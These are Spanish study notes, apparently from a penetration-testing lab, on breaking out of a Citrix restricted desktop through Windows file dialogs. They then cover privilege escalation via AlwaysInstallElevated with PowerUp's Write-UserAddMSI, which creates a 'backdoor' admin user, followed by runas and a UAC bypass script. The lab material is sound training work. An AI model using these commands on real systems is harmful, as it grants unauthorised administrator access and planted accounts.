
Muchas empresas ofrecen plataformas de virtualizacion como Terminal Services, Citrix, AWS AppStream... para ofrecer soluciones de acceso remoto y en la mayoria se implementan medidas de bloqueo para minimizar el impacto potencial de ataques

Metodologia de evasion:

1. Obtener acceso a un cuadro de dialogo
2. Explotar el cuadro para lograr ejecucion de comandos
3. Escalar privs para obtener niveles de acceso mas altos

En algunos entornos poco restringidos puede que haya acceso directo a `cmd.exe` pero en entornos mas protegidos no arrajora ningun resultado al igual que intentar acceder a `C:\Windows\system32` en el gestor de archivos dara error


	Para el ejercicio: tras conectarte como RDP visita http://humongousretail.com/remote/auth/login.aspx e introduce las creds que se proporcionan mas adelante. Haz click en Default Desktop para obtener el archivo launch.ica para conectarte al entorno restringido

## Omitir restricciones de ruta

Si intentamos ir a C:\Users desde el Explorador de archivos nos saldra un error, se debe a que debe haber una politica de grupo que nos permita navegar por directorios de C:\

Podemos usar el cuadro de dialogo de Windows como medio para omitir las restricciones impuestas

Una vez que tenemos el cuadro de dialogo el siguiente paso es intentar acceder a la carpeta que contiene ejecutables


Muchas aplicaciones tienen funcionalidades que les permiten interactuar con otros directorios del sistema como `Abrir, Buscar, Explorar, Importar...` esto nos dara la oportunidad de invocar un cuadro de dialogo de Windows. Algunas herramientas son:

- Notepad
- Wordpad...

## Escalada de privs

Una vez que tenemos un cmd es mas facil buscar vulns con herramientas como [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) y [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)

Si usamos PowerUp vemos que la clave Always Install Elevated esta presente

Lo podemos validar usando cmd:

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
![[Pasted image 20260913130819.png]]

Podemos usar de nuevo PowerUp con la funcion Write-UserAddMSI que facilita la creacion de un achivo .msi en el escritorio:

```
Import-Module .\PowerUp.ps1
Write-UserAddMSI
```
![[Pasted image 20260913130917.png]]

Si ejecutamos el UserAdd.msi, se crea un usuario `backdoor:T3st@123` en el grupo Administrators (la cred tiene que cumplir con los criterios de complejidad)

![[Pasted image 20260913131017.png]]

Podemos ejecutar runas con el nuevo usuario y obtener contexto de admin:

```
runas /user:backdoor cmd
```
![[Pasted image 20260913131041.png]]

## Omitir UAC

Aunque el usuario backdoor este en el grupo Administrators no podemos acceder a C:\Users\Administrator por que el UAC nos lo impide

![[Pasted image 20260913131456.png]]

Hay muchos scripts de bypass de UAC

```
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```
![[Pasted image 20260913131534.png]]

Tras omitir exitosamente el UAC se abre una nueva ventana de PS con privs altos que podemos confirmar con `whoami /all` o `whoami /priv`

![[Pasted image 20260913131629.png]]
